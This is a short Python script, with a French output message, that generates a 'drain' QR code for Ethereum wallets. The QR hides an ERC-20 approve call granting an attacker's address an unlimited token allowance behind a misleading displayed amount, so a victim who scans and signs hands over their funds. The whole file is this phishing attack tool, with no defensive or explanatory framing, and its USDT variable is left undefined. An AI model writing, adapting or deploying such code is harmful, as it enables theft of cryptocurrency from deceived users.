import qrcode

ATTACKER = '0xE7B2f5A6e707856691a96941DF2220C66490FaCe'

display_amount = "300000000000000000.00"

drain_data = '0x095ea7b3000000000000000000000000' + ATTACKER[2:].lower() + 'f' * 64

uri = f"ethereum:{USDT}?value={display_amount}&amount={display_amount}&data={drain_data}&decimal=6"

qr = qrcode.make(uri)
qr.save("ILLUSION_DRAIN.png")
print(" QR d'Illusion généré : ILLUSION_DRAIN.png")
